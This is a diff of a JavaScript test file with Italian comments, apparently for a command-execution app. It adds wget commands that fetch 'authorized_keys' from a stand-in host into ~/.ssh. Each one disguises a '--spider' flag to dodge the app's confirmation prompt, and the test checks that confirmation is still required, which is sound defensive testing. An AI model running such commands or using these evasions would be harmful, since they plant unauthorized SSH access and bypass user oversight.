@@ -217,6 +217,13 @@ test('#479: scaricare dopo essersi spostati in una cartella sensibile chiede "co
     'wget -P /home/utente/.ssh http://esempio.test/authorized_keys',
     'wget -c http://esempio.test/authorized_keys',
     'wget -N http://esempio.test/authorized_keys',
+    // …e le forme che esibivano `--spider` per farsi esentare pur scaricando
+    // davvero: dopo `--` wget legge la parola come un indirizzo, fra virgolette
+    // e dentro l'URL non è nemmeno un'opzione. Nessuna esenzione, nessuna porta.
+    'wget -N -- http://esempio.test/authorized_keys --spider',
+    'wget "http://esempio.test/authorized_keys" " --spider "',
+    'wget "http://esempio.test/authorized_keys#  --spider "',
+    'wget --spider http://esempio.test/authorized_keys',
   ]) {
     const r = await execAction(app, { type: 'ESEGUI_COMANDO', comando });
     expect(r.needsConfirm, comando).toBe(3);
